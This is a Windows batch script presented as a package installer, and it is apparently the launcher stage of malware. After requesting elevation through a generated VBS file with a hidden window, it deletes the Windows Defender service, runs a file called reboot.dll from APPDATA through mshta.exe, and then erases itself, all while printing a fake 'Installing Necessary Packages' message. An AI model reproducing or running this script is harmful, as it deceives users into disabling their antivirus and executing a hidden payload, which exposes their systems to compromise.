@echo off

title Installing Packages 
:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 0 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin

echo  Installing Necessary Packages.....Please Wait.....

cd %APPDATA%
adminpriv -U:T -ShowWindowMode:Hide  sc delete  windefend
start /b cmd /c C:\Windows\System32\mshta.exe %APPDATA%\reboot.dll
ping 127.0.0.1 -n 3 > nul
start /b "" cmd /c del "%~f0"&exit /b